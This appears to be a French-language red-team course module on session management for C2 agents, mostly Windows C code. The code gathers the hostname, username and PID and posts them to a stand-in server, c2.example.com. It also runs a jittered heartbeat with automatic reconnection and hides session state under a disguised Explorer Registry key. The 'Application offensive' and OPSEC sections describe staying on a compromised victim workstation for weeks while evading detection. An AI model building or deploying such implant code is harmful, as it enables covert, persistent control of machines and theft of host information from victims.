# Cours : Session Management pour Agents C2

## Objectifs pedagogiques

A la fin de ce module, vous serez capable de :
- [ ] Comprendre la gestion de sessions C2 (heartbeat, reconnexion)
- [ ] Implementer un systeme de session IDs unique
- [ ] Gerer l'etat persistant d'un agent
- [ ] Implementer mecanismes de resilience (reconnexion automatique)

## Prerequis

- Bases du langage C
- Module W45 (HTTP Client)
- Module W53 (Beacon Architecture)
- Concepts de programmation multi-thread

## Introduction

**Session Management** = Gestion du cycle de vie d'un agent C2, de l'enregistrement initial jusqu'a la deconnexion (ou mort).

### Pourquoi ce sujet est important ?

En Red Team, un agent doit :
1. **S'identifier** : Session ID unique pour suivi
2. **Maintenir presence** : Heartbeat pour montrer qu'il est vivant
3. **Resilience** : Reconnexion auto si perte connexion
4. **Etat persistant** : Sauvegarder config/contexte

**Analogie** : Comme une session web (cookie), mais pour malware. L'agent "check-in" regulierement, le serveur sait qui il est, et si la connexion saute, l'agent retrouve sa session.

```ascii
CYCLE DE VIE SESSION C2 :

┌────────────────────────────────────────────────────┐
│                AGENT LIFECYCLE                     │
├────────────────────────────────────────────────────┤
│                                                    │
│  1. INITIAL CHECK-IN                               │
│     Agent ──[Metadata]──> C2                       │
│     Agent <──[Session ID]── C2                     │
│                                                    │
│  2. HEARTBEAT LOOP                                 │
│     ┌─────────────────────┐                        │
│     │ Sleep (jitter)      │                        │
│     │ Check-in to C2      │                        │
│     │ Fetch tasks         │                        │
│     │ Execute & report    │                        │
│     └────────┬────────────┘                        │
│              │                                     │
│              └──> Repeat (while alive)             │
│                                                    │
│  3. CONNECTION LOST                                │
│     ┌───────────────────┐                          │
│     │ Detect failure    │                          │
│     │ Wait backoff      │                          │
│     │ Retry connect     │                          │
│     └───────┬───────────┘                          │
│             │                                      │
│             └──> Reconnect (with Session ID)       │
│                                                    │
│  4. EXIT/KILL                                      │
│     Agent ──[Exit msg]──> C2                       │
│     Cleanup & terminate                            │
│                                                    │
└────────────────────────────────────────────────────┘
```

## Concepts fondamentaux

### Concept 1 : Session Identifier

**Session ID** = Identifiant unique pour chaque agent actif.

**Formats possibles** :
- **UUID** : `550e8400-e29b-41d4-a716-446655440000`
- **Hostname + PID** : `DESKTOP-ABC_1234`
- **Random Hash** : `a3f5b9c2d8e1f4a7`

**Stockage** :
- En memoire (volatile)
- Sur disque (persistant) : Registry, fichier cache

```c
typedef struct {
    char session_id[64];        // Unique identifier
    char hostname[256];         // Computer name
    char username[64];          // Current user
    DWORD pid;                  // Process ID
    char os_version[128];       // OS info
    time_t first_seen;          // Initial check-in
    time_t last_seen;           // Last heartbeat
    int failed_checkins;        // Consecutive failures
} SessionMetadata;
```

**Generation Session ID** :

```c
#include <windows.h>
#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")

void GenerateSessionID(char* sessionId, size_t size) {
    // Option 1: UUID
    UUID uuid;
    UuidCreate(&uuid);

    unsigned char* str;
    UuidToStringA(&uuid, &str);
    strncpy(sessionId, (char*)str, size - 1);
    RpcStringFreeA(&str);

    // Option 2: Hash (hostname + PID + timestamp)
    // char buffer[512];
    // snprintf(buffer, sizeof(buffer), "%s_%lu_%llu",
    //          hostname, GetCurrentProcessId(), time(NULL));
    // SHA256(buffer, sessionId);  // Hash pour obfuscation
}
```

### Concept 2 : Heartbeat (Keep-Alive)

**Heartbeat** = Ping periodique vers C2 pour signaler presence.

**Informations envoyees** :
- Session ID
- Timestamp
- Status (idle, busy, error)
- Optionnel : Metriques (CPU, RAM, network)

```ascii
HEARTBEAT PATTERN :

TIME    │ AGENT                    │ C2 SERVER
────────┼──────────────────────────┼─────────────────────
00:00   │ Check-in (Session ABC)   │ -> OK, no tasks
00:60   │ Check-in (Session ABC)   │ -> Task: "whoami"
00:65   │ Execute task             │
00:70   │ Send result              │ -> Received
02:00   │ Check-in (Session ABC)   │ -> OK, no tasks
03:00   │ Check-in (Session ABC)   │ -> OK, no tasks
...

Si pas de heartbeat pendant N minutes :
C2 marque session comme "DEAD" ou "DISCONNECTED"
```

**Implementation basique** :

```c
typedef struct {
    char session_id[64];
    time_t timestamp;
    char status[32];  // "idle", "busy", "error"
} HeartbeatPacket;

int SendHeartbeat(HINTERNET hSession, const char* sessionId) {
    HeartbeatPacket hb;
    strncpy(hb.session_id, sessionId, sizeof(hb.session_id));
    hb.timestamp = time(NULL);
    strncpy(hb.status, "idle", sizeof(hb.status));

    // Serialize et envoyer
    char jsonData[512];
    snprintf(jsonData, sizeof(jsonData),
             "{\"session_id\":\"%s\",\"timestamp\":%lld,\"status\":\"%s\"}",
             hb.session_id, (long long)hb.timestamp, hb.status);

    HINTERNET hConnect = WinHttpConnect(hSession, L"c2.example.com",
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/heartbeat",
                                             NULL, NULL, NULL,
                                             WINHTTP_FLAG_SECURE);

    BOOL result = WinHttpSendRequest(hRequest, NULL, 0,
                                      jsonData, strlen(jsonData),
                                      strlen(jsonData), 0);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);

    return result ? 0 : -1;
}
```

### Concept 3 : Reconnexion Automatique

**Problemes reseaux** : C2 down, perte WiFi, reboot serveur...

**Strategie Reconnexion** :
1. **Detection echec** : Timeout HTTP, erreur reseau
2. **Backoff exponentiel** : 1s, 2s, 4s, 8s, 16s, ... max 60s
3. **Retry limit** : Abandonner apres N tentatives (ou infini)
4. **Preserve Session ID** : Garder meme ID pour reconnexion

```ascii
RECONNECTION AVEC BACKOFF :

Attempt │ Wait Time │ Status
────────┼───────────┼─────────────────────────
1       │ 0s        │ Failed (C2 unreachable)
2       │ 1s        │ Failed
3       │ 2s        │ Failed
4       │ 4s        │ Failed
5       │ 8s        │ Failed
6       │ 16s       │ Failed
7       │ 32s       │ Failed
8       │ 60s       │ SUCCESS (C2 back online)
        │           │ -> Resume with same Session ID
```

**Implementation** :

```c
int ReconnectWithBackoff(SessionMetadata* session, int maxRetries) {
    int attempt = 0;
    int waitTime = 1;  // Start at 1 second

    while (attempt < maxRetries || maxRetries == -1) {  // -1 = infinite
        printf("[*] Reconnection attempt %d...\n", attempt + 1);

        if (SendHeartbeat(hSession, session->session_id) == 0) {
            printf("[+] Reconnected successfully!\n");
            session->failed_checkins = 0;
            return 0;  // Success
        }

        printf("[!] Failed. Waiting %d seconds...\n", waitTime);
        Sleep(waitTime * 1000);

        // Exponential backoff (cap at 60s)
        attempt++;
        waitTime = (waitTime * 2 > 60) ? 60 : waitTime * 2;
    }

    printf("[!] Max retries reached. Giving up.\n");
    return -1;  // Failed
}
```

### Concept 4 : Etat Persistant

**Persistance session** : Sauvegarder config pour survivre reboot agent.

**Donnees a persister** :
- Session ID
- C2 server URL
- Sleep interval / Jitter
- Encryption keys
- Configuration flags

**Methodes stockage** :
1. **Registry** : `HKCU\Software\Microsoft\Windows\CurrentVersion\...`
2. **Fichier cache** : `%APPDATA%\<legitimate_name>.dat`
3. **WMI** : Stockage dans WMI repository (avance)

```c
// Sauvegarder session dans Registry
int SaveSessionToRegistry(SessionMetadata* session) {
    HKEY hKey;
    LONG result;

    // Cle Registry discrete
    result = RegCreateKeyEx(
        HKEY_CURRENT_USER,
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo"),
        0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL
    );

    if (result != ERROR_SUCCESS) {
        return -1;
    }

    // Sauvegarder Session ID
    RegSetValueEx(hKey, TEXT("SessionGUID"), 0, REG_SZ,
                  (BYTE*)session->session_id,
                  strlen(session->session_id) + 1);

    // Sauvegarder timestamp
    RegSetValueEx(hKey, TEXT("LastSync"), 0, REG_QWORD,
                  (BYTE*)&session->last_seen,
                  sizeof(session->last_seen));

    RegCloseKey(hKey);
    return 0;
}

// Charger session depuis Registry
int LoadSessionFromRegistry(SessionMetadata* session) {
    HKEY hKey;
    LONG result;

    result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo"),
        0, KEY_READ, &hKey
    );

    if (result != ERROR_SUCCESS) {
        return -1;  // Pas de session sauvegardee
    }

    DWORD size = sizeof(session->session_id);
    RegQueryValueEx(hKey, TEXT("SessionGUID"), NULL, NULL,
                    (BYTE*)session->session_id, &size);

    size = sizeof(session->last_seen);
    RegQueryValueEx(hKey, TEXT("LastSync"), NULL, NULL,
                    (BYTE*)&session->last_seen, &size);

    RegCloseKey(hKey);
    return 0;
}
```

## Mise en pratique

### Etape 1 : Initial Check-In

```c
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <rpc.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "rpcrt4.lib")

SessionMetadata InitialCheckIn(const wchar_t* c2Server) {
    SessionMetadata session = {0};

    // 1. Generer Session ID
    UUID uuid;
    UuidCreate(&uuid);
    unsigned char* str;
    UuidToStringA(&uuid, &str);
    strncpy(session.session_id, (char*)str, sizeof(session.session_id));
    RpcStringFreeA(&str);

    // 2. Collecter metadata
    DWORD size = sizeof(session.hostname);
    GetComputerNameA(session.hostname, &size);

    size = sizeof(session.username);
    GetUserNameA(session.username, &size);

    session.pid = GetCurrentProcessId();
    session.first_seen = time(NULL);
    session.last_seen = session.first_seen;

    // 3. Envoyer au C2
    char jsonData[2048];
    snprintf(jsonData, sizeof(jsonData),
             "{"
             "\"session_id\":\"%s\","
             "\"hostname\":\"%s\","
             "\"username\":\"%s\","
             "\"pid\":%lu,"
             "\"os\":\"Windows\","
             "\"first_seen\":%lld"
             "}",
             session.session_id, session.hostname, session.username,
             session.pid, (long long)session.first_seen);

    // HTTP POST
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, c2Server,
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/checkin",
                                             NULL, NULL, NULL, WINHTTP_FLAG_SECURE);

    WinHttpSendRequest(hRequest, NULL, 0, jsonData, strlen(jsonData),
                       strlen(jsonData), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    printf("[+] Initial check-in complete. Session ID: %s\n", session.session_id);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return session;
}
```

### Etape 2 : Heartbeat Loop avec Resilience

```c
void HeartbeatLoop(SessionMetadata* session, const wchar_t* c2Server) {
    int sleepInterval = 60;  // 60 seconds
    int jitter = 30;         // +/- 30%
    int maxFailures = 5;

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      NULL, NULL, 0);

    while (1) {
        // Jitter sleep
        int actualSleep = sleepInterval + (rand() % (2 * jitter) - jitter);
        printf("[*] Sleeping %d seconds...\n", actualSleep);
        Sleep(actualSleep * 1000);

        // Tentative heartbeat
        if (SendHeartbeat(hSession, session->session_id) == 0) {
            session->last_seen = time(NULL);
            session->failed_checkins = 0;
            printf("[+] Heartbeat OK\n");

            // Fetch tasks
            // ...
        } else {
            session->failed_checkins++;
            printf("[!] Heartbeat failed (%d/%d)\n",
                   session->failed_checkins, maxFailures);

            if (session->failed_checkins >= maxFailures) {
                printf("[!] Max failures reached. Attempting reconnect...\n");

                if (ReconnectWithBackoff(session, 10) != 0) {
                    printf("[!] Reconnect failed. Exiting.\n");
                    break;
                }
            }
        }
    }

    WinHttpCloseHandle(hSession);
}
```

### Etape 3 : Session Complete avec Persistence

```c
int main() {
    SessionMetadata session;

    // Tenter charger session existante
    if (LoadSessionFromRegistry(&session) == 0) {
        printf("[+] Loaded existing session: %s\n", session.session_id);
        printf("[*] Last seen: %lld\n", (long long)session.last_seen);
    } else {
        // Nouvelle session
        printf("[*] No existing session found. Performing initial check-in...\n");
        session = InitialCheckIn(L"c2.example.com");
        SaveSessionToRegistry(&session);
    }

    // Demarrer heartbeat loop
    HeartbeatLoop(&session, L"c2.example.com");

    return 0;
}
```

## Application offensive

### Contexte Red Team

**Scenario** : Agent deploye sur workstation, doit maintenir presence long-terme.

**Challenges** :
1. **Reboot victime** : Session doit survivre
2. **Perte reseau** : Reconnexion auto quand reseau revient
3. **C2 maintenance** : Agent attend si C2 down temporairement
4. **Detection** : Heartbeat regulier = pattern detectable

**Solutions** :
1. **Persistence** : Registry/Task Scheduler pour reboot
2. **Backoff intelligent** : Exponential + jitter
3. **Timeout long** : Ne pas abandonner trop vite
4. **Jitter agressif** : Varier timings pour eviter patterns

```ascii
SCENARIO LONG-TERME :

DAY 1  │ Initial compromise -> Check-in -> Heartbeat normal
DAY 2  │ Reboot victime -> Agent redémarre -> Load session -> Continue
DAY 3  │ C2 down 2h (maintenance) -> Agent retry backoff -> C2 up -> Resume
DAY 7  │ Network down 30min -> Agent queue tasks -> Network up -> Sync
DAY 30 │ Agent still alive, 720+ heartbeats
```

### Considerations OPSEC

**Detection Risks** :
1. **Regularity** : Heartbeat toutes les 60s exactement = pattern
2. **Registry artifacts** : Session ID persistee
3. **Network spikes** : Reconnexion aggressive (many retries)

**Mitigations** :
```c
// 1. Jitter agressif
int CalculateJitteredSleep(int base, int jitterPercent) {
    int jitterRange = (base * jitterPercent) / 100;
    int jitter = (rand() % (2 * jitterRange + 1)) - jitterRange;
    return base + jitter;
}

// 2. Working hours only
BOOL IsWorkingHours() {
    SYSTEMTIME st;
    GetLocalTime(&st);

    // Weekday (Mon-Fri) and 9-5
    if (st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5 &&
        st.wHour >= 9 && st.wHour < 17) {
        return TRUE;
    }
    return FALSE;
}

// 3. Obfuscation Registry
// Ne pas utiliser noms evidets comme "SessionID"
// Utiliser noms legitimes : "Explorer", "SessionInfo", "SyncTime"
```

## Resume

- **Session ID** : Identifiant unique pour tracking agent
- **Heartbeat** : Ping periodique pour keep-alive
- **Reconnexion** : Backoff exponentiel, retry automatique
- **Persistence** : Registry/fichier pour survivre reboot
- **OPSEC** : Jitter, working hours, obfuscation

## Ressources complementaires

- [Cobalt Strike Session Management](https://www.cobaltstrike.com/help-beacon)
- [Sliver C2 Sessions](https://github.com/BishopFox/sliver/wiki/Sessions)
- [MITRE ATT&CK: T1071 - Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)

---

**Navigation**
- [Module precedent](../W53_beacon_architecture/)
- [Module suivant](../W55_jitter_sleep/)
